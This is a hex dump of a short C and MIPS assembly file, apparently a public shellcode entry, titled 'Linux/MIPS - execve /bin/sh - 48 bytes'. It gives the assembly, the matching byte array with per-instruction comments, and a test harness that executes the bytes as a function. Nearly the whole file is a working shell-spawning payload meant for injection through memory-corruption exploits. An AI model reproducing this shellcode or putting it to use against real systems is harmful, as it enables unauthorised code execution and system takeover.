00000000  2f 2a 20 54 69 74 6c 65  3a 20 20 4c 69 6e 75 78  |/* Title:  Linux|
00000010  2f 4d 49 50 53 20 2d 20  65 78 65 63 76 65 20 2f  |/MIPS - execve /|
00000020  62 69 6e 2f 73 68 20 2d  20 34 38 20 62 79 74 65  |bin/sh - 48 byte|
00000030  73 0d 0a 20 20 20 44 61  74 65 3a 20 20 20 32 30  |s..   Date:   20|
00000040  31 31 2d 31 31 2d 32 34  0d 0a 20 20 20 41 75 74  |11-11-24..   Aut|
00000050  68 6f 72 3a 20 72 69 67  61 6e 20 2d 20 69 6d 72  |hor: rigan - imr|
00000060  69 67 61 6e 20 5b 61 74  5d 20 67 6d 61 69 6c 2e  |igan [at] gmail.|
00000070  63 6f 6d 0d 0a 20 20 20  20 0d 0a 20 20 20 20 20  |com..    ..     |
00000080  20 20 20 2e 74 65 78 74  0d 0a 20 20 20 20 20 20  |   .text..      |
00000090  20 20 2e 67 6c 6f 62 61  6c 20 5f 5f 73 74 61 72  |  .global __star|
000000a0  74 0d 0a 5f 5f 73 74 61  72 74 3a 0d 0a 20 20 20  |t..__start:..   |
000000b0  20 20 20 20 20 73 6c 74  69 20 24 61 32 2c 20 24  |     slti $a2, $|
000000c0  7a 65 72 6f 2c 20 2d 31  0d 0a 20 20 20 20 20 20  |zero, -1..      |
000000d0  20 20 6c 69 20 24 74 37  2c 20 30 78 32 66 32 66  |  li $t7, 0x2f2f|
000000e0  36 32 36 39 0d 0a 20 20  20 20 20 20 20 20 73 77  |6269..        sw|
000000f0  20 24 74 37 2c 20 2d 31  32 28 24 73 70 29 0d 0a  | $t7, -12($sp)..|
00000100  20 20 20 20 20 20 20 20  6c 69 20 24 74 36 2c 20  |        li $t6, |
00000110  30 78 36 65 32 66 37 33  36 38 0d 0a 20 20 20 20  |0x6e2f7368..    |
00000120  20 20 20 20 73 77 20 24  74 36 2c 20 2d 38 28 24  |    sw $t6, -8($|
00000130  73 70 29 0d 0a 20 20 20  20 20 20 20 20 73 77 20  |sp)..        sw |
00000140  24 7a 65 72 6f 2c 20 2d  34 28 24 73 70 29 0d 0a  |$zero, -4($sp)..|
00000150  20 20 20 20 20 20 20 20  6c 61 20 24 61 30 2c 20  |        la $a0, |
00000160  2d 31 32 28 24 73 70 29  0d 0a 20 20 20 20 20 20  |-12($sp)..      |
00000170  20 20 73 6c 74 69 20 24  61 31 2c 20 24 7a 65 72  |  slti $a1, $zer|
00000180  6f 2c 20 2d 31 0d 0a 20  20 20 20 20 20 20 20 6c  |o, -1..        l|
00000190  69 20 24 76 30 2c 20 34  30 31 31 0d 0a 20 20 20  |i $v0, 4011..   |
000001a0  20 20 20 20 20 73 79 73  63 61 6c 6c 20 30 78 34  |     syscall 0x4|
000001b0  30 34 30 34 0d 0a 2a 2f  0d 0a 20 0d 0a 23 69 6e  |0404..*/.. ..#in|
000001c0  63 6c 75 64 65 20 3c 73  74 64 69 6f 2e 68 3e 0d  |clude <stdio.h>.|
000001d0  0a 20 0d 0a 20 0d 0a 63  68 61 72 20 73 63 5b 5d  |. .. ..char sc[]|
000001e0  20 3d 20 7b 0d 0a 20 20  20 20 20 20 20 20 22 5c  | = {..        "\|
000001f0  78 32 38 5c 78 30 36 5c  78 66 66 5c 78 66 66 22  |x28\x06\xff\xff"|
00000200  20 20 20 20 20 20 20 20  2f 2a 20 73 6c 74 69 20  |        /* slti |
00000210  20 20 20 61 32 2c 7a 65  72 6f 2c 2d 31 20 20 20  |   a2,zero,-1   |
00000220  2a 2f 0d 0a 20 20 20 20  20 20 20 20 22 5c 78 33  |*/..        "\x3|
00000230  63 5c 78 30 66 5c 78 32  66 5c 78 32 66 22 20 20  |c\x0f\x2f\x2f"  |
00000240  20 20 20 20 20 20 2f 2a  20 6c 75 69 20 20 20 20  |      /* lui    |
00000250  20 74 37 2c 30 78 32 66  32 66 20 20 20 20 2a 2f  | t7,0x2f2f    */|
00000260  0d 0a 20 20 20 20 20 20  20 20 22 5c 78 33 35 5c  |..        "\x35\|
00000270  78 65 66 5c 78 36 32 5c  78 36 39 22 20 20 20 20  |xef\x62\x69"    |
00000280  20 20 20 20 2f 2a 20 6f  72 69 20 20 20 20 20 74  |    /* ori     t|
00000290  37 2c 74 37 2c 30 78 36  32 36 39 20 2a 2f 0d 0a  |7,t7,0x6269 */..|
000002a0  20 20 20 20 20 20 20 20  22 5c 78 61 66 5c 78 61  |        "\xaf\xa|
000002b0  66 5c 78 66 66 5c 78 66  34 22 20 20 20 20 20 20  |f\xff\xf4"      |
000002c0  20 20 2f 2a 20 73 77 20  20 20 20 20 20 74 37 2c  |  /* sw      t7,|
000002d0  2d 31 32 28 73 70 29 20  20 20 2a 2f 0d 0a 20 20  |-12(sp)   */..  |
000002e0  20 20 20 20 20 20 22 5c  78 33 63 5c 78 30 65 5c  |      "\x3c\x0e\|
000002f0  78 36 65 5c 78 32 66 22  20 20 20 20 20 20 20 20  |x6e\x2f"        |
00000300  2f 2a 20 6c 75 69 20 20  20 20 20 74 36 2c 30 78  |/* lui     t6,0x|
00000310  36 65 32 66 20 20 20 20  2a 2f 0d 0a 20 20 20 20  |6e2f    */..    |
00000320  20 20 20 20 22 5c 78 33  35 5c 78 63 65 5c 78 37  |    "\x35\xce\x7|
00000330  33 5c 78 36 38 22 20 20  20 20 20 20 20 20 2f 2a  |3\x68"        /*|
00000340  20 6f 72 69 20 20 20 20  20 74 36 2c 74 36 2c 30  | ori     t6,t6,0|
00000350  78 37 33 36 38 20 2a 2f  0d 0a 20 20 20 20 20 20  |x7368 */..      |
00000360  20 20 22 5c 78 61 66 5c  78 61 65 5c 78 66 66 5c  |  "\xaf\xae\xff\|
00000370  78 66 38 22 20 20 20 20  20 20 20 20 2f 2a 20 73  |xf8"        /* s|
00000380  77 20 20 20 20 20 20 74  36 2c 2d 38 28 73 70 29  |w      t6,-8(sp)|
00000390  20 20 20 20 2a 2f 0d 0a  20 20 20 20 20 20 20 20  |    */..        |
000003a0  22 5c 78 61 66 5c 78 61  30 5c 78 66 66 5c 78 66  |"\xaf\xa0\xff\xf|
000003b0  63 22 20 20 20 20 20 20  20 20 2f 2a 20 73 77 20  |c"        /* sw |
000003c0  20 20 20 20 20 7a 65 72  6f 2c 2d 34 28 73 70 29  |     zero,-4(sp)|
000003d0  20 20 2a 2f 0d 0a 20 20  20 20 20 20 20 20 22 5c  |  */..        "\|
000003e0  78 32 37 5c 78 61 34 5c  78 66 66 5c 78 66 34 22  |x27\xa4\xff\xf4"|
000003f0  20 20 20 20 20 20 20 20  2f 2a 20 61 64 64 69 75  |        /* addiu|
00000400  20 20 20 61 30 2c 73 70  2c 2d 31 32 20 20 20 20  |   a0,sp,-12    |
00000410  2a 2f 0d 0a 20 20 20 20  20 20 20 20 22 5c 78 32  |*/..        "\x2|
00000420  38 5c 78 30 35 5c 78 66  66 5c 78 66 66 22 20 20  |8\x05\xff\xff"  |
00000430  20 20 20 20 20 20 2f 2a  20 73 6c 74 69 20 20 20  |      /* slti   |
00000440  20 61 31 2c 7a 65 72 6f  2c 2d 31 20 20 20 2a 2f  | a1,zero,-1   */|
00000450  0d 0a 20 20 20 20 20 20  20 20 22 5c 78 32 34 5c  |..        "\x24\|
00000460  78 30 32 5c 78 30 66 5c  78 61 62 22 20 20 20 20  |x02\x0f\xab"    |
00000470  20 20 20 20 2f 2a 20 6c  69 20 20 20 20 20 20 76  |    /* li      v|
00000480  30 2c 34 30 31 31 20 20  20 20 20 20 2a 2f 0d 0a  |0,4011      */..|
00000490  20 20 20 20 20 20 20 20  22 5c 78 30 31 5c 78 30  |        "\x01\x0|
000004a0  31 5c 78 30 31 5c 78 30  63 22 20 20 20 20 20 20  |1\x01\x0c"      |
000004b0  20 20 2f 2a 20 73 79 73  63 61 6c 6c 20 30 78 34  |  /* syscall 0x4|
000004c0  30 34 30 34 20 20 20 20  20 20 2a 2f 0d 0a 7d 3b  |0404      */..};|
000004d0  0d 0a 20 0d 0a 76 6f 69  64 20 6d 61 69 6e 28 76  |.. ..void main(v|
000004e0  6f 69 64 29 0d 0a 7b 0d  0a 20 20 20 20 20 20 20  |oid)..{..       |
000004f0  76 6f 69 64 28 2a 73 29  28 76 6f 69 64 29 3b 0d  |void(*s)(void);.|
00000500  0a 20 20 20 20 20 20 20  70 72 69 6e 74 66 28 22  |.       printf("|
00000510  73 69 7a 65 3a 20 25 64  5c 6e 22 2c 20 73 74 72  |size: %d\n", str|
00000520  6c 65 6e 28 73 63 29 29  3b 0d 0a 20 20 20 20 20  |len(sc));..     |
00000530  20 20 73 20 3d 20 73 63  3b 0d 0a 20 20 20 20 20  |  s = sc;..     |
00000540  20 20 73 28 29 3b 0d 0a  7d                       |  s();..}|
00000549
